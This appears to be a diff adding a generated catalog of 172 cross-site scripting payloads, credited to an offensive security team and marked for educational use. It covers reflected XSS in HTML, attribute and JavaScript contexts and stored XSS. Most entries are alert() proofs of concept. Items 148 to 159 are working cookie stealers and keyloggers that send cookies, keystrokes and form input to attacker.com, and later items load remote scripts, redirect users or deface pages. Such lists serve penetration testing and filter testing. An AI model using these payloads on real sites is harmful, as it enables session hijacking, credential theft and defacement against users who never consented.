@@ -1,0 +1,1406 @@
+================================================================================
+XSS PAYLOAD CATALOG - EDUCATIONAL USE ONLY
+Generated : 2026-02-20 18:30:04
+Author    : Offensive Team Zeta - ITSOLERA (PVT) LTD
+WARNING   : Use only on authorized systems with permission
+================================================================================
+
+[1] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Basic script tag injection
+Payload    : <script>alert('XSS')</script>
+--------------------------------------------------------------------------------
+
+[2] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Minimal script alert
+Payload    : <script>alert(1)</script>
+--------------------------------------------------------------------------------
+
+[3] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Display current domain
+Payload    : <script>alert(document.domain)</script>
+--------------------------------------------------------------------------------
+
+[4] REFLECTED XSS - HTML Context
+Severity   : Critical
+Description: Display cookies
+Payload    : <script>alert(document.cookie)</script>
+--------------------------------------------------------------------------------
+
+[5] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Confirm dialog box
+Payload    : <script>confirm('XSS')</script>
+--------------------------------------------------------------------------------
+
+[6] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Prompt dialog box
+Payload    : <script>prompt('XSS')</script>
+--------------------------------------------------------------------------------
+
+[7] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Display window origin
+Payload    : <script>alert(window.origin)</script>
+--------------------------------------------------------------------------------
+
+[8] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Display document URL
+Payload    : <script>alert(document.URL)</script>
+--------------------------------------------------------------------------------
+
+[9] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Script without closing tag
+Payload    : <script>alert('XSS')//
+--------------------------------------------------------------------------------
+
+[10] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Script with data URI
+Payload    : <script src=data:,alert(1)>
+--------------------------------------------------------------------------------
+
+[11] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Image tag with onerror event
+Payload    : <img src=x onerror=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[12] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Minimal image onerror
+Payload    : <img src=x onerror=alert(1)>
+--------------------------------------------------------------------------------
+
+[13] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Image tag with onload event
+Payload    : <img src=x onload=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[14] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Image with prompt dialog
+Payload    : <img src=x onerror=prompt('XSS')>
+--------------------------------------------------------------------------------
+
+[15] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Image without src value
+Payload    : <img src onerror=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[16] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Image with invalid src
+Payload    : <img src=/ onerror=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[17] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Image with javascript protocol
+Payload    : <img src=javascript:alert('XSS')>
+--------------------------------------------------------------------------------
+
+[18] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Image with dynsrc attribute
+Payload    : <img dynsrc=javascript:alert('XSS')>
+--------------------------------------------------------------------------------
+
+[19] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Image with lowsrc attribute
+Payload    : <img lowsrc=javascript:alert('XSS')>
+--------------------------------------------------------------------------------
+
+[20] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Image with quoted attributes
+Payload    : <img src='x' onerror='alert(1)'>
+--------------------------------------------------------------------------------
+
+[21] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Image with slash separator
+Payload    : <img/src=x onerror=alert(1)>
+--------------------------------------------------------------------------------
+
+[22] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Image with eval in onerror
+Payload    : <img src=x:alert(1) onerror=eval(src)>
+--------------------------------------------------------------------------------
+
+[23] REFLECTED XSS - HTML Context
+Severity   : High
+Description: SVG tag with onload event
+Payload    : <svg onload=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[24] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Minimal SVG onload
+Payload    : <svg onload=alert(1)>
+--------------------------------------------------------------------------------
+
+[25] REFLECTED XSS - HTML Context
+Severity   : High
+Description: SVG with embedded script
+Payload    : <svg><script>alert('XSS')</script></svg>
+--------------------------------------------------------------------------------
+
+[26] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: SVG animate with onbegin
+Payload    : <svg><animate onbegin=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[27] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: SVG set attribute
+Payload    : <svg><set attributeName=onmouseover to=alert(1)>
+--------------------------------------------------------------------------------
+
+[28] REFLECTED XSS - HTML Context
+Severity   : High
+Description: SVG with slash separator
+Payload    : <svg/onload=alert(1)>
+--------------------------------------------------------------------------------
+
+[29] REFLECTED XSS - HTML Context
+Severity   : High
+Description: SVG with template literals
+Payload    : <svg onload=alert`1`>
+--------------------------------------------------------------------------------
+
+[30] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: SVG animatetransform
+Payload    : <svg><animatetransform onbegin=alert(1)>
+--------------------------------------------------------------------------------
+
+[31] REFLECTED XSS - HTML Context
+Severity   : High
+Description: SVG title with script
+Payload    : <svg><title><script>alert(1)</script></title>
+--------------------------------------------------------------------------------
+
+[32] REFLECTED XSS - HTML Context
+Severity   : High
+Description: SVG desc with script
+Payload    : <svg><desc><script>alert(1)</script></desc>
+--------------------------------------------------------------------------------
+
+[33] REFLECTED XSS - HTML Context
+Severity   : High
+Description: SVG foreignObject
+Payload    : <svg><foreignObject><script>alert(1)</script></foreignObject>
+--------------------------------------------------------------------------------
+
+[34] REFLECTED XSS - HTML Context
+Severity   : High
+Description: MathML with script
+Payload    : <math><mtext><script>alert(1)</script></mtext>
+--------------------------------------------------------------------------------
+
+[35] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: SVG animated href
+Payload    : <svg><a><animate attributeName=href values=javascript:alert(1)><text x=20 y=20>Click</text></a>
+--------------------------------------------------------------------------------
+
+[36] REFLECTED XSS - HTML Context
+Severity   : High
+Description: SVG script with HTML entities
+Payload    : <svg><script>alert&#40;1&#41;</script>
+--------------------------------------------------------------------------------
+
+[37] REFLECTED XSS - HTML Context
+Severity   : High
+Description: SVG with namespace
+Payload    : <svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>
+--------------------------------------------------------------------------------
+
+[38] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Iframe with javascript protocol
+Payload    : <iframe src=javascript:alert('XSS')>
+--------------------------------------------------------------------------------
+
+[39] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Iframe with onload event
+Payload    : <iframe onload=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[40] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Iframe with srcdoc attribute
+Payload    : <iframe srcdoc='<script>alert(1)</script>'>
+--------------------------------------------------------------------------------
+
+[41] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Iframe with data URI
+Payload    : <iframe src=data:text/html,<script>alert(1)</script>>
+--------------------------------------------------------------------------------
+
+[42] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Iframe with confirm
+Payload    : <iframe src=javascript:confirm(1)>
+--------------------------------------------------------------------------------
+
+[43] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Iframe with prompt
+Payload    : <iframe src=javascript:prompt(1)>
+--------------------------------------------------------------------------------
+
+[44] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Iframe with entity encoding
+Payload    : <iframe src=j&#x61;vascript:alert(1)>
+--------------------------------------------------------------------------------
+
+[45] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Iframe with slash separator
+Payload    : <iframe/src=javascript:alert(1)>
+--------------------------------------------------------------------------------
+
+[46] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Body tag with onload event
+Payload    : <body onload=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[47] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Body tag with onpageshow
+Payload    : <body onpageshow=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[48] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Body with onhashchange
+Payload    : <body onhashchange=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[49] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Body with onfocus
+Payload    : <body onfocus=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[50] REFLECTED XSS - HTML Context
+Severity   : Low
+Description: Body with onresize
+Payload    : <body onresize=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[51] REFLECTED XSS - HTML Context
+Severity   : Low
+Description: Body with onscroll
+Payload    : <body onscroll=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[52] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Input with autofocus and onfocus
+Payload    : <input onfocus=alert('XSS') autofocus>
+--------------------------------------------------------------------------------
+
+[53] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Input with blur event
+Payload    : <input onblur=alert('XSS') autofocus><input autofocus>
+--------------------------------------------------------------------------------
+
+[54] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Select with autofocus
+Payload    : <select onfocus=alert('XSS') autofocus>
+--------------------------------------------------------------------------------
+
+[55] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Textarea with autofocus
+Payload    : <textarea onfocus=alert('XSS') autofocus>
+--------------------------------------------------------------------------------
+
+[56] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Button with onclick
+Payload    : <button onclick=alert('XSS')>Click
+--------------------------------------------------------------------------------
+
+[57] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Button with formaction
+Payload    : <form><button formaction=javascript:alert(1)>Click
+--------------------------------------------------------------------------------
+
+[58] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Submit with formaction
+Payload    : <input type=submit formaction=javascript:alert(1)>
+--------------------------------------------------------------------------------
+
+[59] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Image input with onerror
+Payload    : <input type=image src=x onerror=alert(1)>
+--------------------------------------------------------------------------------
+
+[60] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Search input with onsearch
+Payload    : <form><input type=search onsearch=alert(1) autofocus>
+--------------------------------------------------------------------------------
+
+[61] REFLECTED XSS - HTML Context
+Severity   : Low
+Description: Keygen with autofocus
+Payload    : <keygen onfocus=alert(1) autofocus>
+--------------------------------------------------------------------------------
+
+[62] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Details tag with ontoggle
+Payload    : <details open ontoggle=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[63] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Details with summary
+Payload    : <details ontoggle=alert('XSS')><summary>click</summary>
+--------------------------------------------------------------------------------
+
+[64] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Details with iframe
+Payload    : <details><summary>click</summary><iframe src=javascript:alert(1)>
+--------------------------------------------------------------------------------
+
+[65] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Dialog with onclose
+Payload    : <dialog open>XSS</dialog><script>document.querySelector('dialog').onclose=alert(1)</script>
+--------------------------------------------------------------------------------
+
+[66] REFLECTED XSS - HTML Context
+Severity   : Low
+Description: Marquee with onstart event
+Payload    : <marquee onstart=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[67] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Object with javascript protocol
+Payload    : <object data=javascript:alert('XSS')>
+--------------------------------------------------------------------------------
+
+[68] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Embed with javascript protocol
+Payload    : <embed src=javascript:alert('XSS')>
+--------------------------------------------------------------------------------
+
+[69] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Object with data URI
+Payload    : <object data=data:text/html,<script>alert(1)</script>>
+--------------------------------------------------------------------------------
+
+[70] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Embed with data URI
+Payload    : <embed src=data:text/html,<script>alert(1)</script>>
+--------------------------------------------------------------------------------
+
+[71] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Object with Flash SWF
+Payload    : <object data='//attacker.com/xss.swf'>
+--------------------------------------------------------------------------------
+
+[72] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Embed with code attribute
+Payload    : <embed code=javascript:alert(1)>
+--------------------------------------------------------------------------------
+
+[73] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Applet with code
+Payload    : <applet code=javascript:alert(1)>
+--------------------------------------------------------------------------------
+
+[74] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Base tag hijack
+Payload    : <base href=javascript:alert(1)//>
+--------------------------------------------------------------------------------
+
+[75] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Video source with onerror
+Payload    : <video><source onerror=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[76] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Audio with onerror
+Payload    : <audio src=x onerror=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[77] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Video with onerror
+Payload    : <video src=x onerror=alert(1)>
+--------------------------------------------------------------------------------
+
+[78] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Audio with onloadstart
+Payload    : <audio onloadstart=alert(1)>
+--------------------------------------------------------------------------------
+
+[79] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Video with poster
+Payload    : <video poster=javascript:alert(1)>
+--------------------------------------------------------------------------------
+
+[80] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Video track XSS
+Payload    : <video><track kind=subtitles src=data:text/vtt,WEBVTT default>
+--------------------------------------------------------------------------------
+
+[81] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Link with CSS expression
+Payload    : <link rel=stylesheet href=data:,*%7Bx:expression(alert(1))%7D>
+--------------------------------------------------------------------------------
+
+[82] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Style with CSS expression
+Payload    : <style>*{x:expression(alert(1))}</style>
+--------------------------------------------------------------------------------
+
+[83] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Style import javascript
+Payload    : <style>@import'javascript:alert(1)';</style>
+--------------------------------------------------------------------------------
+
+[84] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Meta refresh with javascript
+Payload    : <meta http-equiv=refresh content='0;url=javascript:alert(1)'>
+--------------------------------------------------------------------------------
+
+[85] REFLECTED XSS - HTML Context
+Severity   : Low
+Description: Bgsound with javascript
+Payload    : <bgsound src=javascript:alert(1)>
+--------------------------------------------------------------------------------
+
+[86] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Frameset with onload
+Payload    : <frameset onload=alert(1)>
+--------------------------------------------------------------------------------
+
+[87] REFLECTED XSS - HTML Context
+Severity   : Low
+Description: Table background javascript
+Payload    : <table background=javascript:alert(1)>
+--------------------------------------------------------------------------------
+
+[88] REFLECTED XSS - HTML Context
+Severity   : Medium
+Description: Anchor with javascript protocol
+Payload    : <a href=javascript:alert(1)>click
+--------------------------------------------------------------------------------
+
+[89] REFLECTED XSS - HTML Context
+Severity   : High
+Description: Form with javascript action
+Payload    : <form action=javascript:alert(1)><input type=submit>
+--------------------------------------------------------------------------------
+
+[90] REFLECTED XSS - HTML Context
+Severity   : Low
+Description: Isindex formaction
+Payload    : <isindex type=submit value=XSS formaction=javascript:alert(1)>
+--------------------------------------------------------------------------------
+
+[91] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Break out of attribute with onload
+Payload    : " onload="alert('XSS')
+--------------------------------------------------------------------------------
+
+[92] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Onfocus with autofocus attribute
+Payload    : " onfocus="alert('XSS')" autofocus="
+--------------------------------------------------------------------------------
+
+[93] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Onmouseover event handler
+Payload    : " onmouseover="alert('XSS')
+--------------------------------------------------------------------------------
+
+[94] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Onclick event handler
+Payload    : " onclick="alert('XSS')
+--------------------------------------------------------------------------------
+
+[95] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Onerror event handler
+Payload    : " onerror="alert('XSS')
+--------------------------------------------------------------------------------
+
+[96] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Onanimationend event
+Payload    : " onanimationend="alert('XSS')
+--------------------------------------------------------------------------------
+
+[97] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Ontransitionend event
+Payload    : " ontransitionend="alert('XSS')
+--------------------------------------------------------------------------------
+
+[98] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Ondrag event handler
+Payload    : " ondrag="alert('XSS')
+--------------------------------------------------------------------------------
+
+[99] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Ondrop event handler
+Payload    : " ondrop="alert('XSS')
+--------------------------------------------------------------------------------
+
+[100] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Onchange event handler
+Payload    : " onchange="alert('XSS')
+--------------------------------------------------------------------------------
+
+[101] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Low
+Description: Onwheel event handler
+Payload    : " onwheel="alert('XSS')
+--------------------------------------------------------------------------------
+
+[102] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Onsubmit event handler
+Payload    : " onsubmit="alert('XSS')
+--------------------------------------------------------------------------------
+
+[103] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Oninput event handler
+Payload    : " oninput="alert('XSS')
+--------------------------------------------------------------------------------
+
+[104] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Onsearch event handler
+Payload    : " onsearch="alert('XSS')
+--------------------------------------------------------------------------------
+
+[105] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Onkeydown event handler
+Payload    : " onkeydown="alert('XSS')
+--------------------------------------------------------------------------------
+
+[106] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Close tag and inject script
+Payload    : "><script>alert('XSS')</script>
+--------------------------------------------------------------------------------
+
+[107] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Close tag and inject image
+Payload    : "><img src=x onerror=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[108] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Close tag and inject SVG
+Payload    : "><svg onload=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[109] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Close tag and inject iframe
+Payload    : "><iframe src=javascript:alert('XSS')>
+--------------------------------------------------------------------------------
+
+[110] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Close tag and inject body
+Payload    : "><body onload=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[111] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Close tag and inject input
+Payload    : "><input onfocus=alert('XSS') autofocus>
+--------------------------------------------------------------------------------
+
+[112] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Close tag and inject video
+Payload    : "><video src=x onerror=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[113] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Close tag and inject audio
+Payload    : "><audio src=x onerror=alert('XSS')>
+--------------------------------------------------------------------------------
+
+[114] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Close tag and inject object
+Payload    : "><object data=javascript:alert('XSS')>
+--------------------------------------------------------------------------------
+
+[115] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Close tag and inject embed
+Payload    : "><embed src=javascript:alert('XSS')>
+--------------------------------------------------------------------------------
+
+[116] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Single quote breakout
+Payload    : ' onload='alert("XSS")'
+--------------------------------------------------------------------------------
+
+[117] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Single quote with autofocus
+Payload    : ' onfocus='alert("XSS")' autofocus='
+--------------------------------------------------------------------------------
+
+[118] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Single quote onclick
+Payload    : ' onclick='alert("XSS")'
+--------------------------------------------------------------------------------
+
+[119] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Single quote onerror
+Payload    : ' onerror='alert("XSS")'
+--------------------------------------------------------------------------------
+
+[120] REFLECTED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Single quote onmouseover
+Payload    : ' onmouseover='alert("XSS")'
+--------------------------------------------------------------------------------
+
+[121] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Single quote tag close
+Payload    : '><script>alert("XSS")</script>
+--------------------------------------------------------------------------------
+
+[122] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Single quote image inject
+Payload    : '><img src=x onerror=alert("XSS")>
+--------------------------------------------------------------------------------
+
+[123] REFLECTED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Single quote SVG inject
+Payload    : '><svg onload=alert("XSS")>
+--------------------------------------------------------------------------------
+
+[124] REFLECTED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Break out of string with semicolon
+Payload    : '; alert('XSS'); //
+--------------------------------------------------------------------------------
+
+[125] REFLECTED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Break out with double quotes
+Payload    : "; alert("XSS"); //
+--------------------------------------------------------------------------------
+
+[126] REFLECTED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Character code obfuscation
+Payload    : ';alert(String.fromCharCode(88,83,83));//
+--------------------------------------------------------------------------------
+
+[127] REFLECTED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Regular expression in alert
+Payload    : ';alert(/XSS/);//
+--------------------------------------------------------------------------------
+
+[128] REFLECTED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Template literal injection
+Payload    : `;alert`1`;//
+--------------------------------------------------------------------------------
+
+[129] REFLECTED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Backslash escape attempt
+Payload    : \';alert(1);//
+--------------------------------------------------------------------------------
+
+[130] REFLECTED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Alert domain from string
+Payload    : ';alert(document.domain);//
+--------------------------------------------------------------------------------
+
+[131] REFLECTED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Confirm dialog
+Payload    : ';confirm(1);//
+--------------------------------------------------------------------------------
+
+[132] REFLECTED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Prompt dialog
+Payload    : ';prompt(1);//
+--------------------------------------------------------------------------------
+
+[133] REFLECTED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Eval function call
+Payload    : ';eval('alert(1)');//
+--------------------------------------------------------------------------------
+
+[134] REFLECTED XSS - JAVASCRIPT Context
+Severity   : High
+Description: SetTimeout injection
+Payload    : ';setTimeout('alert(1)',0);//
+--------------------------------------------------------------------------------
+
+[135] REFLECTED XSS - JAVASCRIPT Context
+Severity   : High
+Description: SetInterval injection
+Payload    : ';setInterval('alert(1)',0);//
+--------------------------------------------------------------------------------
+
+[136] REFLECTED XSS - JAVASCRIPT Context
+Severity   : Medium
+Description: Break out of multi-line comment
+Payload    : */; alert('XSS'); /*
+--------------------------------------------------------------------------------
+
+[137] REFLECTED XSS - JAVASCRIPT Context
+Severity   : Medium
+Description: HTML comment escape
+Payload    : <!--*/; alert('XSS'); //-->
+--------------------------------------------------------------------------------
+
+[138] REFLECTED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Newline comment bypass
+Payload    : //
+alert('XSS');//
+--------------------------------------------------------------------------------
+
+[139] REFLECTED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Empty comment bypass
+Payload    : /**/alert(1);//
+--------------------------------------------------------------------------------
+
+[140] REFLECTED XSS - JAVASCRIPT Context
+Severity   : Medium
+Description: MySQL-style comment
+Payload    : /*!alert(1)*/
+--------------------------------------------------------------------------------
+
+[141] REFLECTED XSS - JAVASCRIPT Context
+Severity   : Medium
+Description: Double comment escape
+Payload    : //*/alert(1);//
+--------------------------------------------------------------------------------
+
+[142] REFLECTED XSS - JAVASCRIPT Context
+Severity   : Medium
+Description: Close function and inject
+Payload    : }; alert('XSS'); //
+--------------------------------------------------------------------------------
+
+[143] REFLECTED XSS - JAVASCRIPT Context
+Severity   : Medium
+Description: Close parenthesis and inject
+Payload    : ); alert('XSS'); //
+--------------------------------------------------------------------------------
+
+[144] REFLECTED XSS - JAVASCRIPT Context
+Severity   : Medium
+Description: Close array and inject
+Payload    : ]; alert('XSS'); //
+--------------------------------------------------------------------------------
+
+[145] REFLECTED XSS - JAVASCRIPT Context
+Severity   : Medium
+Description: Close nested structures
+Payload    : });alert('XSS');//
+--------------------------------------------------------------------------------
+
+[146] REFLECTED XSS - JAVASCRIPT Context
+Severity   : Medium
+Description: Break statement injection
+Payload    : break;alert('XSS');//
+--------------------------------------------------------------------------------
+
+[147] REFLECTED XSS - JAVASCRIPT Context
+Severity   : Medium
+Description: Return statement injection
+Payload    : return;alert('XSS');//
+--------------------------------------------------------------------------------
+
+[148] STORED XSS - HTML Context
+Severity   : Critical
+Description: Cookie stealer using fetch API
+Payload    : <script>fetch('http://attacker.com?c='+document.cookie)</script>
+--------------------------------------------------------------------------------
+
+[149] STORED XSS - HTML Context
+Severity   : Critical
+Description: Cookie stealer using image error
+Payload    : <img src=x onerror='location="http://attacker.com?c="+document.cookie'>
+--------------------------------------------------------------------------------
+
+[150] STORED XSS - HTML Context
+Severity   : Critical
+Description: Cookie stealer using Image object
+Payload    : <script>new Image().src='http://attacker.com?c='+document.cookie</script>
+--------------------------------------------------------------------------------
+
+[151] STORED XSS - HTML Context
+Severity   : Critical
+Description: SVG-based cookie stealer
+Payload    : <svg onload='fetch("http://attacker.com?c="+document.cookie)'>
+--------------------------------------------------------------------------------
+
+[152] STORED XSS - HTML Context
+Severity   : Critical
+Description: Cookie stealer using sendBeacon
+Payload    : <script>navigator.sendBeacon('http://attacker.com',document.cookie)</script>
+--------------------------------------------------------------------------------
+
+[153] STORED XSS - HTML Context
+Severity   : Critical
+Description: Cookie stealer using location
+Payload    : <script>document.location='http://attacker.com?c='+document.cookie</script>
+--------------------------------------------------------------------------------
+
+[154] STORED XSS - HTML Context
+Severity   : Critical
+Description: Iframe cookie stealer
+Payload    : <iframe src=x onload="fetch('http://attacker.com?c='+parent.document.cookie)">
+--------------------------------------------------------------------------------
+
+[155] STORED XSS - HTML Context
+Severity   : Critical
+Description: External script loader
+Payload    : <script>with(document)with(body)with(appendChild(createElement('script')))src='//attacker.com'</script>
+--------------------------------------------------------------------------------
+
+[156] STORED XSS - HTML Context
+Severity   : Critical
+Description: Simple keylogger
+Payload    : <script>document.onkeypress=function(e){fetch('http://attacker.com?k='+e.key)}</script>
+--------------------------------------------------------------------------------
+
+[157] STORED XSS - HTML Context
+Severity   : Critical
+Description: Keydown event logger
+Payload    : <script>document.addEventListener('keydown',e=>fetch('//attacker.com?k='+e.key))</script>
+--------------------------------------------------------------------------------
+
+[158] STORED XSS - HTML Context
+Severity   : Critical
+Description: Input value logger
+Payload    : <script>setInterval(()=>fetch('//attacker.com?v='+document.querySelector('input').value),1000)</script>
+--------------------------------------------------------------------------------
+
+[159] STORED XSS - HTML Context
+Severity   : Critical
+Description: Multi-input logger
+Payload    : <script>document.querySelectorAll('input').forEach(i=>i.addEventListener('input',e=>fetch('//attacker.com?'+e.target.value)))</script>
+--------------------------------------------------------------------------------
+
+[160] STORED XSS - HTML Context
+Severity   : High
+Description: Page redirect
+Payload    : <script>window.location='http://attacker.com'</script>
+--------------------------------------------------------------------------------
+
+[161] STORED XSS - HTML Context
+Severity   : High
+Description: Meta refresh redirect
+Payload    : <meta http-equiv='refresh' content='0;url=http://attacker.com'>
+--------------------------------------------------------------------------------
+
+[162] STORED XSS - HTML Context
+Severity   : High
+Description: Top frame redirect
+Payload    : <script>top.location='http://attacker.com'</script>
+--------------------------------------------------------------------------------
+
+[163] STORED XSS - HTML Context
+Severity   : High
+Description: Parent frame redirect
+Payload    : <script>parent.location='http://attacker.com'</script>
+--------------------------------------------------------------------------------
+
+[164] STORED XSS - HTML Context
+Severity   : High
+Description: Window.open redirect
+Payload    : <script>window.open('http://attacker.com','_self')</script>
+--------------------------------------------------------------------------------
+
+[165] STORED XSS - HTML Context
+Severity   : High
+Description: Location.replace redirect
+Payload    : <script>location.replace('http://attacker.com')</script>
+--------------------------------------------------------------------------------
+
+[166] STORED XSS - HTML Context
+Severity   : High
+Description: Page defacement
+Payload    : <script>document.body.innerHTML='<h1>Hacked!</h1>'</script>
+--------------------------------------------------------------------------------
+
+[167] STORED XSS - HTML Context
+Severity   : High
+Description: Document.write defacement
+Payload    : <script>document.write('<h1>Defaced</h1>')</script>
+--------------------------------------------------------------------------------
+
+[168] STORED XSS - HTML Context
+Severity   : Medium
+Description: Background color change
+Payload    : <script>document.body.style.background='red'</script>
+--------------------------------------------------------------------------------
+
+[169] STORED XSS - HTML Context
+Severity   : Low
+Description: Title change
+Payload    : <script>document.title='Hacked by XSS'</script>
+--------------------------------------------------------------------------------
+
+[170] STORED XSS - HTML Context
+Severity   : High
+Description: Body removal
+Payload    : <script>alert('XSS');document.body.remove()</script>
+--------------------------------------------------------------------------------
+
+[171] STORED XSS - HTML Context
+Severity   : Medium
+Description: CSS-based hiding
+Payload    : <style>body{display:none}</style><h1>Hacked</h1>
+--------------------------------------------------------------------------------
+
+[172] STORED XSS - HTML Context
+Severity   : High
+Description: Simple stored XSS
+Payload    : <img src=x onerror=alert('Stored XSS')>
